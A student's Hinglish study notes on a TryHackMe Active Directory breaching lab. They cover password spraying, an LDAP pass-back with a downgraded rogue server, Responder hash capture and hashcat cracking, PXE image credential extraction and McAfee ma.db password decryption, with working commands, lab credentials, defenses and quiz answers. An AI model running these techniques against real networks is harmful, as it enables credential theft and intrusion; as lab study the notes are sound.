

### Name: Dhruv Sharma | Date: 7th June 2026 | Platform: TryHackMe

---

# TASK 2 — OSINT & Phishing

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
AD mein initial credentials kaise milte hain
bina network touch kiye
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
OSINT = Publicly available information se
credentials dhundhna (no hacking, just searching)

Phishing = Fake pages/emails se user se
credentials karwana ya RAT install karwana

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY SOURCES:

OSINT ke liye:
→ Stack Overflow    : Developers accidentally
                      credentials paste kar dete
→ GitHub            : Hardcoded creds in scripts
→ HaveIBeenPwned    : Check karo email breach mein
                      hai ya nahi
→ DeHashed          : Leaked credentials database

Phishing ke liye:
→ Fake login page   : User credentials type kare
→ RAT attachment    : User ke context mein run ho

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS: N/A (passive techniques)

🏁 RESULT:
Valid AD credentials without touching the network

🛡️ DEFENSE:
→ Employees ko training do — public forums pe
  credentials share mat karo
→ GitHub secret scanning enable karo
→ HaveIBeenPwned alerts setup karo
→ MFA enforce karo (stolen creds useless ho jaayein)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Website to check email/password breach?
A: HaveIBeenPwned
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 3 — NTLM / NetNTLM Password Spraying

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Exposed NTLM services pe valid credentials find
karna without triggering account lockout
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:

NetNTLM kya hai:
→ Challenge-Response based authentication
→ App khud verify nahi karta — DC ko forward karta hai
→ DC check karta hai → haan/nahi batata
→ App credentials store nahi karta

Exposed services jo NetNTLM use karte hain:
→ OWA (Outlook Web App)
→ RDP (Remote Desktop)
→ VPN endpoints
→ Internet-facing web apps

Brute Force vs Password Spray:
→ Brute Force  : Ek user, bahut passwords → LOCKOUT ❌
→ Password Spray: Ek password, bahut users → NO LOCKOUT ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. Username list collect karo (OSINT se)
2. Onboarding/default password identify karo
   (e.g., "Changeme123")
3. Spray script run karo
4. HTTP 200 = Valid | HTTP 401 = Invalid

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

python ntlm_passwordspray.py \
  -u usernames.txt \        → username list
  -f za.tryhackme.com \     → target domain (FQDN)
  -p Changeme123 \          → spray karne wala password
  -a http://ntlmauth.za.tryhackme.com
                            → target URL

Output:
[+] Valid credential pair found!
    Username: [user] Password: Changeme123

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 HOW SCRIPT WORKS:
→ Har user ke liye HTTP GET request bhejta hai
→ HttpNtlmAuth se authenticate karta hai
→ Response 200 = Valid creds found!
→ Response 401 = Wrong password

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT: Valid AD credential pairs mili

🛡️ DEFENSE:
→ Account lockout policy set karo
  (failed attempts ke baad lock)
→ MFA enable karo on all external services
→ Password spraying alerts set karo SIEM mein
  (ek IP se bahut usernames try = alert)
→ Strong onboarding passwords + force change
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Challenge-response mechanism naam?
A: NetNTLM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 4 — LDAP Pass-back Attack

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Network printer ke LDAP service account ka
plaintext password capture karna
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
→ Printer LDAP use karta hai AD authentication ke liye
→ LDAP settings mein password hidden hota hai
  (directly nahi dekh sakte)
→ Lekin: LDAP Server IP apni machine ka kar do
→ Printer hamare fake server se connect karega
→ Credentials hamare paas aa jaayenge!

Problem with just Netcat:
→ Printer pehle LDAP negotiation karta hai
→ Secure auth method select karta hai
→ Credentials plaintext mein nahi aate

Solution:
→ Rogue LDAP server banao
→ Sirf PLAIN aur LOGIN support karo
→ Force karo ki plaintext mein credentials aayein

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. Printer web interface access karo
   → http://printer.za.tryhackme.com/settings.aspx
   → Default creds se login (admin:admin)

2. LDAP Server IP change karo
   → Original DC IP → Apna Attack Machine IP

3. Rogue LDAP Server setup karo (OpenLDAP)

4. LDAP ko insecure banao (downgrade)

5. "Test Settings" click karo

6. TCPdump se credentials capture karo

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Step 1: OpenLDAP install
sudo apt-get install slapd ldap-utils

# Step 2: Rogue LDAP configure
sudo dpkg-reconfigure -p low slapd
(Domain: za.tryhackme.com)

# Step 3: Downgrade auth — olcSaslSecProps.ldif file
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
→ minssf=0     : No minimum security (plaintext allow)
→ noanonymous  : Anonymous login disable

# Step 4: Config apply karo
sudo ldapmodify -Y EXTERNAL -H ldapi:// \
  -f ./olcSaslSecProps.ldif && sudo service slapd restart

# Step 5: Verify (sirf PLAIN aur LOGIN dikhne chahiye)
ldapsearch -H ldap:// -x -LLL -s base \
  -b "" supportedSASLMechanisms

# Step 6: Credentials capture karo
sudo tcpdump -SX -i breachad tcp port 389

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
TCPdump mein dikh jaata hai:
za.tryhackme.com\svcLDAP → password: password11

🛡️ DEFENSE:
→ LDAP Signing enforce karo (Group Policy)
→ LDAPS (port 636) use karo — plaintext nahi
→ Default printer credentials change karo
→ Printers ko alag VLAN mein rakho
→ Service account least privilege do
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Attack type against LDAP not found in NTLM?
A: Pass-back Attack
Q: Two auth mechanisms on rogue server?
A: PLAIN and LOGIN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 5 — SMB + Responder (NetNTLM Capture & Relay)

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Network pe flying NetNTLM hashes capture karo
aur offline crack karo
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:

SMB kya hai:
→ Server Message Block protocol
→ File sharing, remote admin, printing — sab kuch
→ NetNTLM authentication use karta hai

LLMNR / NBT-NS / WPAD kya hain:
→ Jab DNS fail ho, Windows broadcast karta hai
  "Koi jaanta hai [hostname] ka IP?"
→ Responder in broadcasts ka jawab deta hai
  "Haan main jaanta hoon! Mere paas aao"
→ Client hamare paas connect karta hai
→ NetNTLM challenge-response capture!

Do attacks possible hain:
1. Capture + Crack  : Hash lo, offline crack karo
2. Relay            : Hash relay karo doosre server pe
                      (bina crack kiye access lo)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. Responder run karo — poisons LLMNR/NBT-NS/WPAD
2. Koi machine broadcast karti hai → Responder answer
3. NTLMv2 hash capture hota hai
4. Hash file mein copy karo
5. Hashcat se crack karo

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Responder start karo
sudo responder -I breachad
→ -I : Interface specify karo

# Output jo milega:
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<username>
[SMBv2] NTLMv2-SSP Hash     : <hash>

# Hash crack karo — Hashcat
hashcat -m 5600 <hash_file> <password_file> --force
→ -m 5600 : NTLMv2-SSP hash type
→ --force : CPU use karo (agar GPU nahi)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 RELAY ATTACK (theory):
Direct crack ki jagah hash relay karo:
Victim → Attacker → Target Server (victim ke naam pe)
Conditions needed:
→ SMB Signing disabled hona chahiye
→ Relayed account ko target pe permissions chahiye

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
Cracked password = valid AD credentials

🛡️ DEFENSE:
→ LLMNR disable karo (Group Policy)
→ NBT-NS disable karo
→ SMB Signing enforce karo (relay rokta hai)
→ Network monitoring — unusual LLMNR traffic
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Tool name for poisoning auth requests?
A: Responder
Q: Hash type for Hashcat?
A: 5600 (NTLMv2-SSP)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 6 — MDT / PXE Boot Attack

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
PXE Boot image se deployment service account
credentials nikalna
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 KEY TERMS:

MDT (Microsoft Deployment Toolkit):
→ OS deploy karne ka Microsoft tool
→ New machines pe network se Windows install karta hai
→ Boot images centrally manage karta hai

SCCM:
→ MDT ka bada bhai
→ Already installed software ke patches manage karta hai

PXE Boot:
→ Network cable lagao → Automatically Windows install
→ DHCP se IP milti hai → TFTP se image download
→ Image mein credentials embedded hoti hain!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. MDT server ka IP dhundho (nslookup)
2. BCD file download karo (TFTP se)
3. BCD file parse karo → WIM file location nikalo
4. WIM file download karo (TFTP se)
5. PowerPXE se credentials extract karo

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# SSH into jump host
ssh thm@THMJMP1.za.tryhackme.com
Password: Password1@

# MDT server IP find karo
nslookup thmmdt.za.tryhackme.com

# BCD file download (TFTP)
tftp -i <MDT_IP> GET "\Tmp\x64{...}.bcd" conf.bcd
→ TFTP = Trivial File Transfer Protocol (UDP based)
→ /Tmp/ = BCD files yahan hote hain MDT pe

# PowerShell mein PowerPXE use karo
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
→ WIM file ka location milta hai

# WIM file download karo
tftp -i <MDT_IP> GET "<WIM_Location>" pxeboot.wim
(Bada file hai — time lagega)

# Credentials extract karo
Get-FindCredentials -WimFile pxeboot.wim
→ bootstrap.ini file read karta hai
→ UserID, UserDomain, UserPassword nikalta hai

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 IMP FILES:
→ BCD file    : Boot configuration (image location)
→ WIM file    : Bootable Windows image
→ bootstrap.ini : Credentials yahan stored hoti hain

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
DeployRoot, UserID, UserDomain, UserPassword
sab plaintext mein mil jaata hai!

🛡️ DEFENSE:
→ PXE boot images encrypt karo
→ MDT access restrict karo (sirf authorized devices)
→ Bootstrap.ini credentials rotate karo regularly
→ MDT service account least privilege do
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Microsoft tool for PXE Boot images?
A: MDT (Microsoft Deployment Toolkit)
Q: Network protocol for MDT file recovery?
A: TFTP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# TASK 7 — Configuration Files (McAfee ma.db)

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
McAfee AV ki database file se AD service
account credentials decrypt karna
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
→ Enterprise apps ko AD se connect hone ke liye
  credentials chahiye
→ Yeh credentials config files mein store hoti hain
→ McAfee apni creds ma.db mein store karta hai
→ Password encrypted hai — lekin KEY KNOWN hai!
→ Script se decrypt kar sakte hain

Config files worth checking:
→ Web application config files
→ Service configuration files
→ Registry keys
→ Centrally deployed application DBs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ KEY STEPS:

1. ma.db file locate karo
2. SCP se apni machine pe copy karo
3. sqlitebrowser se open karo
4. AGENT_REPOSITORIES table dekho
5. AUTH_PASSWD value copy karo
6. Decrypt script run karo

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# ma.db ka location (fixed path)
C:\ProgramData\McAfee\Agent\DB\ma.db

# SCP se copy karo
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
→ scp = Secure Copy (files SSH ke through transfer)

# SQLite database open karo
sqlitebrowser ma.db
→ Browse Data → AGENT_REPOSITORIES table
→ DOMAIN, AUTH_USER, AUTH_PASSWD note karo

# Password decrypt karo
python2 mcafee_sitelist_pwd_decrypt.py <AUTH_PASSWD_VALUE>
→ Input  : Base64 encoded encrypted password
→ Output : Plaintext decrypted password

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 IMP TABLE INFO:
Database    : ma.db
Table       : AGENT_REPOSITORIES
Key Columns :
  → DOMAIN       : AD domain
  → AUTH_USER    : Service account username
  → AUTH_PASSWD  : Encrypted password (decrypt karo)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏁 RESULT:
McAfee service account ka plaintext password!
Another valid AD credential set!

🛡️ DEFENSE:
→ Config files pe strict permissions lagao
→ Service account credentials regularly rotate karo
→ Credential scanning tools use karo
  (ye files monitor karo)
→ Least privilege for service accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 ANSWERS:
Q: Files that contain stored credentials?
A: Configuration Files
Q: McAfee database name?
A: ma.db
Q: Table storing orchestrator credentials?
A: AGENT_REPOSITORIES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
